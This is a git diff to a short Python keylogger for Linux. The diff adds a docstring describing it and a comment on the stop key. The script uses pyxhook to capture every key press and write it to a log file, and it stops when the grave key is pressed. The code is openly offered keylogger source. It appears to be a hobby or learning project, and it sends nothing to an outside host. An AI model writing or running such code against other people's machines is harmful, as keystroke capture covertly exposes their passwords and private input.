@@ -1,3 +1,12 @@
+"""
+A simple keylogger witten in python for linux platform
+All keystrokes are recorded in a log file.
+
+The program terminates when grave key(`) is pressed
+
+grave key is found below esc key
+"""
+
 import pyxhook
 #change this to your log file's path
 log_file='/home/aman/xxx/file.log'
@@ -8,7 +17,7 @@ def OnKeyPress(event):
   fob.write(event.Key)
   fob.write('\n')
 
-  if event.Ascii==96:
+  if event.Ascii==96: #96 is the ascii value of the grave key (`)
     fob.close()
     new_hook.cancel()
 #create a new hook manager instance
